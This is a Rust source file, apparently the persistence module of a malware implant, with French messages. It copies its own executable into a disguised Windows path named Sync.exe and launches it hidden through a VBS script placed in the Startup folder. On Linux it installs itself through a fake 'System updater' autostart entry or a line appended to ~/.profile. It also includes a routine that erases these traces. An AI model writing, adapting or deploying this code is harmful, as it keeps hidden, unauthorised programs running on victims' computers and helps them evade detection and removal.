use anyhow::Result;
use std::env;
use std::fs::{self, OpenOptions};
use std::io::{BufRead, BufReader, Write};
use std::path::PathBuf;

#[cfg(target_os = "windows")]
use std::io;
#[cfg(target_os = "windows")]
use std::path::Path;

#[cfg(target_os = "windows")]
fn get_executable_path() -> PathBuf {
    let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    PathBuf::from(format!("{}\\Microsoft\\Windows\\CloudStore\\Sync.exe", appdata))
}

#[cfg(target_os = "windows")]
fn get_vbs_path() -> PathBuf {
    let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    PathBuf::from(format!("{}\\Microsoft\\Windows\\CloudStore\\helper.vbs", appdata))
}

#[cfg(target_os = "windows")]
fn get_startup_folder() -> PathBuf {
    let appdata = env::var("APPDATA").unwrap();
    PathBuf::from(format!(
        "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        appdata
    ))
}

#[cfg(target_os = "windows")]
fn write_vbs_launcher(vbs_path: &Path, exe_path: &Path) -> io::Result<()> {
    let script = format!(
        r#"Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run """" & "{}" & """", 0, False"#,
        exe_path.to_string_lossy()
    );

    fs::write(vbs_path, script)
}

#[cfg(target_os = "windows")]
fn copy_to_startup(vbs_path: &Path) -> io::Result<()> {
    let startup = get_startup_folder();
    let dest = startup.join("helper.vbs");
    fs::copy(vbs_path, dest)?;
    Ok(())
}

#[cfg(target_os = "windows")]
fn copy_executable() -> io::Result<PathBuf> {
    let target_path = get_executable_path();

    if target_path.exists() {
        return Ok(target_path);
    }

    let current_path = env::current_exe()?;
    if let Some(parent) = target_path.parent() {
        fs::create_dir_all(parent)?;
    }

    fs::copy(&current_path, &target_path)?;
    Ok(target_path)
}

#[cfg(target_os = "windows")]
pub fn setup_persistence_lolbin() {
    match copy_executable() {
        Ok(exe_path) => {
            let vbs_path = get_vbs_path();
            if let Err(e) = write_vbs_launcher(&vbs_path, &exe_path) {
                eprintln!("Erreur création fichier VBS : {}", e);
                return;
            }

            if let Err(e) = copy_to_startup(&vbs_path) {
                eprintln!("Erreur copie dans Startup : {}", e);
            } else {
                println!("Persistance VBS installée via Startup.");
            }
        }
        Err(e) => eprintln!("Erreur copie exécutable : {}", e),
    }
}

pub fn add_to_autostart_gui() -> std::io::Result<()> {
    let autostart_dir = dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from(format!("{}/.config", env::var("HOME").unwrap())))
        .join("autostart");
    fs::create_dir_all(&autostart_dir)?;

    let exe_path = std::env::current_exe()?.to_string_lossy().to_string();
    let desktop_file = autostart_dir.join("helper.desktop");

    let content = format!(
        "[Desktop Entry]
        Type=Application
        Exec={}
        Hidden=false
        NoDisplay=false
        X-GNOME-Autostart-enabled=true
        Name=Updater
        Comment=System updater
        ",
        exe_path
    );

    fs::write(desktop_file, content)?;
    Ok(())
}

pub fn add_to_profile_terminal() -> Result<()> {
    let home = env::var("HOME")?;
    let profile_path = PathBuf::from(format!("{}/.profile", home));

    let exe_path = std::env::current_exe()?.to_string_lossy().to_string();
    let line = format!("{} &", exe_path);

    if profile_path.exists() {
        let file = fs::File::open(&profile_path)?;
        let reader = BufReader::new(file);
        for l in reader.lines() {
            if let Ok(content) = l {
                if content.contains(&exe_path) {
                    return Ok(());
                }
            }
        }
    }

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&profile_path)?;
    writeln!(file, "{}", line)?;
    Ok(())
}

fn has_gui() -> bool {
    env::var("XDG_SESSION_TYPE").is_ok()
        || env::var("DISPLAY").is_ok()
        || env::var("WAYLAND_DISPLAY").is_ok()
}

pub fn setup_persistence_linux() {
    if has_gui() {
        if let Err(e) = add_to_autostart_gui() {
            eprintln!("Erreur autostart GUI: {}", e);
        }
    } else {
        if let Err(e) = add_to_profile_terminal() {
            eprintln!("Erreur profile terminal: {}", e);
        }
    }
}

#[cfg(target_os = "windows")]
pub fn remove_all_traces() {
    use std::fs;
    let _ = fs::remove_file(get_executable_path());
    let _ = fs::remove_file(get_vbs_path());
    let startup_vbs = get_startup_folder().join("helper.vbs");
    let _ = fs::remove_file(startup_vbs);
}

#[cfg(target_os = "linux")]
pub fn remove_all_traces() {
    use std::env;
    use std::fs;
    if let Some(config_dir) = dirs::config_dir() {
        let autostart = config_dir.join("autostart/helper.desktop");
        let _ = fs::remove_file(autostart);
    }
    if let Ok(home) = env::var("HOME") {
        let profile_path = format!("{}/.profile", home);
        if let Ok(content) = fs::read_to_string(&profile_path) {
            let exe_path = std::env::current_exe()
                .unwrap()
                .to_string_lossy()
                .to_string();
            let new_content: String = content
                .lines()
                .filter(|l| !l.contains(&exe_path))
                .map(|l| format!("{}\n", l))
                .collect();
            let _ = fs::write(&profile_path, new_content);
        }
    }
}

